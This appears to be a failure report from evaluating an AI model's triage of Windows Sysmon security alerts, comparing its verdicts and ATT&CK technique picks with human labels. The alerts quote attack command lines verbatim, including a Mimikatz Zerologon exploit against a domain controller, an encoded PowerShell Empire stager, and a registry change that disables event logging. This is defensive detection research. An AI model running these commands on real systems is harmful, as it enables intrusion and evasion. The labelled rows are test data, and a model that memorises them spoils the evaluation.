# Failures: rag-tools

9 failures out of 30 rows (dev; 0 transport errors skipped). Model openrouter:nvidia/nemotron-3-super-120b-a12b:free, prompt 603f2934198c, labels b0695a44d0d4.

Hints (guesses, not buckets): reasoning error? 1, retrieval miss? 8

---
### day2-031  (verdict true_positive != benign_noisy)

**hint:** reasoning error?  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_schtasks_creation_standard_user.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\windows\system32\svchost.exe`
- registry `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\MordorSchtask\SD` = `Binary Data`

**Label:** benign_noisy [] by `Mouheb+Partner`: Task Scheduler recording metadata for a newly created task; fires the same way for any task regardless of intent.
**Model:** true_positive ['T1053.005'] (confidence 0.8), tier 1

> The event shows svchost.exe modifying the security descriptor (SD) of a scheduled task named 'MordorSchtask' under the TaskCache registry key, which is consistent with creating or altering a Windows Scheduled Task for persistence or execution. The task name is not a known Microsoft task, indicating likely adversary use of the Task Scheduler.

**Retrieved techniques (top 5):** ['T1053.005', 'T1197', 'T1547.001', 'T1218.011', 'T1218.002']  
**Retrieved Sigma rules:** ['4720b7df-40c3-48fd-bbdf-fd4b3c464f0d', '20f0ee37-5942-4e45-b7d5-c5b5db9df5cd', 'cbf93e5d-ca6c-4722-8bea-e9119007c248', '480421f9-417f-4d3b-9552-fd2728443ec8', 'a07f0359-4c90-4dc4-a681-8ffea40b4f47']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/a3efc3e2e657b07071b8beda0829d01c

---

### day3-071  (technique credit 0.00)

**hint:** retrieval miss? (T1021.003 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_allowed.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> uses DCOM to run an Excel 4.0 macro on a remote host.
**Model:** true_positive ['T1036'] (confidence 0.7), tier 1
**Technique credit:** 0.00

> The process is an unsigned executable located in a user's Desktop directory, which is an atypical location for legitimate software, indicating masquerading. It is executed with an internal IP address as an argument, suggesting potential C2 or lateral movement activity.

**Retrieved techniques (top 5):** ['T1070.010', 'T1218.014', 'T1570', 'T1218.003', 'T1080']  
**Retrieved Sigma rules:** ['855bc8b5-2ae8-402e-a9ed-b889e6df1900', 'e4a6b256-3e47-40fc-89d2-7a477edd6915', '502b42de-4306-40b4-9596-6f590c81f073', '7cce6fc8-a07f-4d84-a53e-96e1879843c9', '6b65c28e-11f3-46cb-902a-68f2cafaf474']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/7829d17ff5420a3c86f221706c054edc

---

### day3-166  (technique credit 0.00)

**hint:** retrieval miss? (T1021.003 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `covenant_dcom_executeexcel4macro_blocked.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Desktop\MoveExcel4.exe`
- command line `C:\Users\pgustavo\Desktop\MoveExcel4.exe  172.18.39.6`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Desktop\MoveExcel4.exe 172.18.39.6`

**Label:** true_positive ['T1021.003'] by `Mouadh`: MoveExcel4.exe <IP> attempts DCOM lateral movement by remote Excel 4.0 macro execution.
**Model:** true_positive ['T1204.002'] (confidence 0.85), tier 1
**Technique credit:** 0.00

> The user executed an unsigned executable (MoveExcel4.exe) from their Desktop with an internal IP address as an argument, indicating malicious file execution and potential command-and-control activity.

**Retrieved techniques (top 5):** ['T1070.010', 'T1218.014', 'T1570', 'T1218.003', 'T1080']  
**Retrieved Sigma rules:** ['855bc8b5-2ae8-402e-a9ed-b889e6df1900', 'e4a6b256-3e47-40fc-89d2-7a477edd6915', '502b42de-4306-40b4-9596-6f590c81f073', '7cce6fc8-a07f-4d84-a53e-96e1879843c9', '6b65c28e-11f3-46cb-902a-68f2cafaf474']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/71cb17f09f13258fa5a8c96e57629658

---

### day3-048  (technique credit 0.00)

**hint:** retrieval miss? (T1134 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `aptsimulator_cobaltstrike.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5`, user `WORKSTATION5\APT-Simulator`
- process `C:\TMP\CreateNamedPipe.exe`
- command line `"C:\TMP\CreateNamedPipe.exe"  MSSE-1337-server`
- parent `C:\Windows\System32\cmd.exe` `"C:\Windows\system32\cmd.exe" `

**Label:** true_positive ['T1134'] by `Mouadh`: CreateNamedPipe.exe creating a pipe named MSSE-1337-server matches the Cobalt Strike getsystem named-pipe pattern; the event shows the pipe, not the impersonation, so the parent technique.
**Model:** true_positive ['T1059.003'] (confidence 0.72), tier 1
**Technique credit:** 0.00

> The event shows a non-standard executable CreateNamedPipe.exe located in the temporary directory being launched via cmd.exe with an argument MSSE-1337-server, indicating abuse of the Windows command shell for execution of a potentially malicious binary.

**Retrieved techniques (top 5):** ['T1218.003', 'T1218.014', 'T1555.004', 'T1003.001', 'T1059.003']  
**Retrieved Sigma rules:** ['aa2efee7-34dd-446e-8a37-40790a66efd7', 'cd219ff3-fa99-45d4-8380-a7d15116c6dc', '502b42de-4306-40b4-9596-6f590c81f073', '3c89a1e8-0fba-449e-8f1b-8409d6267ec8', '2617e7ed-adb7-40ba-b0f3-8f9945fe6c09']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/b521d3a1c56b3ab1ce4be8eb6af06a36

---

### day3-095  (verdict benign_noisy != true_positive; technique credit 0.00)

**hint:** retrieval miss? (T1190 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `proxylogon_ssrf_rce_poc.zip`

Event 0:
- source `windows_sysmon`, host `MXS01.azsentinel.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\Windows\System32\cmd.exe`
- command line `cmd /c whoami`
- parent `C:\Windows\System32\inetsrv\w3wp.exe` `c:\windows\system32\inetsrv\w3wp.exe -ap "MSExchangeOWAAppPool" -v "v4.0" -c "C:\Program Files\Microsoft\Exchange Server\V15\bin\GenericAppPoolConfigWithGCServerEnabledFalse.config" -a \\.\pipe\iisipm8e72bd3c-90fe-435f-bda2-fdb8731bc136 -h "C:\inetpub\temp\apppools\MSExchangeOWAAppPool\MSExchangeOWAAppPool.config" -w "" -m 0`

**Label:** true_positive ['T1190'] by `Mouadh`: cmd /c whoami spawned by the IIS worker process w3wp.exe means code execution inside the web server, the ProxyLogon result.
**Model:** benign_noisy [] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows IIS worker process (w3wp.exe) spawning cmd.exe to run 'whoami', a benign system command used to check the current user context. There is no indication of credential access, persistence, or other adversary behavior.

**Retrieved techniques (top 5):** ['T1555.004', 'T1505.002', 'T1218.003', 'T1203', 'T1552.006']  
**Retrieved Sigma rules:** ['2d3cdeec-c0db-45b4-aa86-082f7eb75701', '797011dc-44f4-4e6f-9f10-a8ceefbe566b', '438025f9-5856-4663-83f7-52f878a70a50', 'cc1abf27-78a3-4ac5-a51c-f3070b1d8e40', 'e4a6b256-3e47-40fc-89d2-7a477edd6915']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/37c4b573878e7169c80ad406b60ed66a

---

### day3-113  (technique credit 0.00)

**hint:** retrieval miss? (T1210 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Windows\System32\cmd.exe`
- command line `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Users\pgustavo\Desktop\GruntHTTP.exe` `"C:\Users\pgustavo\Desktop\GruntHTTP.exe" `

**Label:** true_positive ['T1210'] by `Mouadh`: cmd.exe /c mimikatz.exe "lsadump::zerologon ... /exploit" spawned by GruntHTTP.exe, a Covenant C2 implant: the command line shows the Zerologon (CVE-2020-1472) exploit against a domain controller.
**Model:** true_positive ['T1068'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows cmd.exe executing a Mimikatz command that attempts to exploit Zerologon against a domain controller, which is a privilege escalation exploit used to gain unauthorized access. This matches adversarial behavior rather than benign activity.

**Retrieved techniques (top 5):** ['T1218.014', 'T1218.003', 'T1204.004', 'T1204.002', 'T1202']  
**Retrieved Sigma rules:** ['c2b86e67-b880-4eec-b045-50bc98ef4844', '1228c958-e64e-4e71-92ad-7d429f4138ba', '7cce6fc8-a07f-4d84-a53e-96e1879843c9', '502b42de-4306-40b4-9596-6f590c81f073', '7d6d30b8-5b91-4b90-a891-46cccaf29598']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/4aa799620a358b2cbb61505bac564cca

---

### day3-151  (technique credit 0.00)

**hint:** retrieval miss? (T1210 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `mimikatz_CVE-2020-1472_Unauthenticated_NetrServerAuthenticate2.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION5.theshire.local`, user `THESHIRE\pgustavo`
- process `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe`
- command line `C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe  "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`
- parent `C:\Windows\System32\cmd.exe` `"cmd.exe" /c C:\Users\pgustavo\Downloads\mimikatz_trunk\x64\mimikatz.exe "lsadump::zerologon /target:MORDORDC.theshire.local /account:MORDORDC$ /exploit" exit`

**Label:** true_positive ['T1210'] by `Mouadh`: mimikatz lsadump::zerologon /target exploits CVE-2020-1472 (Zerologon) against a domain controller.
**Model:** true_positive ['T1003.001'] (confidence 0.95), tier 1
**Technique credit:** 0.00

> The event shows execution of mimikatz.exe from a user's Downloads directory with command-line arguments invoking the lsadump::zerologon module against a domain controller, which is a known credential‑access technique using Mimikatz to dump credentials via the Zerologon exploit.

**Retrieved techniques (top 5):** ['T1218.014', 'T1218.011', 'T1218.003', 'T1218.004', 'T1204.002']  
**Retrieved Sigma rules:** ['7cce6fc8-a07f-4d84-a53e-96e1879843c9', 'dee0a7a3-f200-4112-a99b-952196d81e42', 'c2b86e67-b880-4eec-b045-50bc98ef4844', '502b42de-4306-40b4-9596-6f590c81f073', 'a642964e-bead-4bed-8910-1bb4d63e3b4d']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/1a53de1dafff71df1d31536ada90c7b0

---

### day3-176  (technique credit 0.25)

**hint:** retrieval miss? (T1569.002 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `empire_psexec_dcerpc_tcp_svcctl.zip`

Event 0:
- source `windows_sysmon`, host `WORKSTATION6.theshire.local`, user `NT AUTHORITY\SYSTEM`
- process `C:\Windows\System32\cmd.exe`
- command line `C:\windows\system32\cmd.exe /C start /b C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAGEAYgBsAEUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AYQBqAG8AcgAgAC0ARwBFACAAMwApAHsAJAA0ADMARABlADIAPQBbAHIARQBGAF0ALgBBAFMAcwBlAE0AQgBsAHkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAEUAYABsAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANAAzAEQARQAyA... (+4599)`
- parent `C:\Windows\System32\services.exe` `C:\windows\system32\services.exe`

**Label:** true_positive ['T1569.002'] by `Mouadh`: cmd.exe started by services.exe running 'start /b powershell -enc' is a remote service executing an encoded stager (PsExec-style).
**Model:** true_positive ['T1059.001'] (confidence 0.86), tier 1
**Technique credit:** 0.25

> The event shows a SYSTEM-level cmd.exe launched from services.exe executing PowerShell with a heavily obfuscated -enc argument, indicating adversary use of PowerShell for execution (T1059.001). The encoded payload likely attempts to modify logging settings, consistent with malicious behavior.

**Retrieved techniques (top 5):** ['T1059.001', 'T1543.003', 'T1547.001', 'T1546.007', 'T1059.003']  
**Retrieved Sigma rules:** ['2a072a96-a086-49fa-bcb5-15cc5a619093', '62b20d44-1546-4e61-afce-8e175eb9473c', 'c49c5062-0966-4170-9efd-9968c913a6cf', '17a1be64-8d88-40bf-b5ff-a4f7a50ebcc8', 'ac175779-025a-4f12-98b0-acdaeb77ea85']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/06a85cc91677630e87cb39e1bc25e010

---

### day2-006  (technique credit 0.50)

**hint:** retrieval miss? (T1685.001 not in top 5)  
**bucket:** _retrieval miss | reasoning error | schema error | label error_  
**note:** 

**Alert:** Atomic capture — manual review (medium), source dataset `reg_disable_eventlog_service_startuptype_modification_via_registry.zip`

Event 0:
- source `windows_sysmon`, host `Pedro01`, user `PEDRO01\pedro`
- process `C:\Users\IT01-Pedro\Downloads\payload.exe`
- registry `HKLM\System\CurrentControlSet\Services\EventLog\Start` = `DWORD (0x00000004)`

**Label:** true_positive ['T1685.001'] by `Mouheb+Partner`: Process named payload.exe (from Downloads) sets the EventLog service Start value to Disabled.
**Model:** true_positive ['T1562.001'] (confidence 0.9), tier 1
**Technique credit:** 0.50

> A process running from the user's Downloads folder (payload.exe) modified the registry value HKLMSystemCurrentControlSetServicesEventLogStart to DWORD 0x00000004, which disables the Windows Event Log service. This is an attempt to impair defensive logging, consistent with adversary behavior.

**Retrieved techniques (top 5):** ['T1547.002', 'T1547.001', 'T1543.003', 'T1547.010', 'T1218.011']  
**Retrieved Sigma rules:** ['790317c0-0a36-4a6a-a105-6e576bf99a14', '07743f65-7ec9-404a-a519-913db7118a8d', '46490193-1b22-4c29-bdd6-5bf63907216f', 'dc5c24af-6995-49b2-86eb-a9ff62199e82', '9c226817-8dc9-46c2-a58d-66655aafd7dc']
**Trace:** https://cloud.langfuse.com/project/cmub63msw005had0chtdazpl6/traces/c22f699d7408f16bb042074a4d883c1a
